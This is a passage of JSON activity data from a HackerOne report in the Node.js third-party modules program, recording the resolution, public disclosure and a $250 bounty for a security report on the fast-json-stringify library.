❤️\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-19T12:14:42.844Z","updated_at":"2019-06-19T12:14:42.844Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5597053,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"can you please mark this as _Resolved_ ?","markdown_message":"\u003cp\u003ecan you please mark this as \u003cu\u003eResolved\u003c/u\u003e ?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-08-17T11:54:13.020Z","updated_at":"2019-08-17T11:54:13.020Z","actor":{"username":"phra","cleared":false,"url":"/phra","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/201/213/71f68147b3cb0e1d6e7e39953fc2c4822d04d338_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5721446,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sincere apologies for the late response, I'll resolve right away!","markdown_message":"\u003cp\u003eSincere apologies for the late response, I\u0026#39;ll resolve right away!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-09-03T18:16:12.290Z","updated_at":"2019-09-03T18:16:12.290Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5721451,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Valuable feedback has been provided and incorporated in the form of security improvements to open source library fast-json-stringify. Thank you!","markdown_message":"\u003cp\u003eValuable feedback has been provided and incorporated in the form of security improvements to open source library fast-json-stringify. Thank you!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-09-03T18:16:47.285Z","updated_at":"2019-09-03T18:16:47.285Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"phra","url":"/phra"},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5721460,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-09-03T18:17:32.445Z","updated_at":"2019-09-03T18:17:32.445Z","first_to_agree":true,"actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5953782,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-03T18:17:41.784Z","updated_at":"2019-10-03T18:17:41.784Z","actor":{"url":"/nodejs-ecosystem","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Node.js third-party modules"}},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6468824,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"@phra notice that you are eligible for bounties now that we have that supported. Thank you for sending this report and for your time!","markdown_message":"\u003cp\u003e\u003ca href=\"/phra\"\u003e@phra\u003c/a\u003e notice that you are eligible for bounties now that we have that supported. Thank you for sending this report and for your time!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-04T20:15:08.007Z","updated_at":"2019-12-04T20:15:08.007Z","actor":{"url":"/nodejs-ecosystem","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Node.js third-party modules"}},"bounty_amount":"250.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"nodejs-ecosystem","collaborator":{"username":"phra","url":"/phra"},"actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}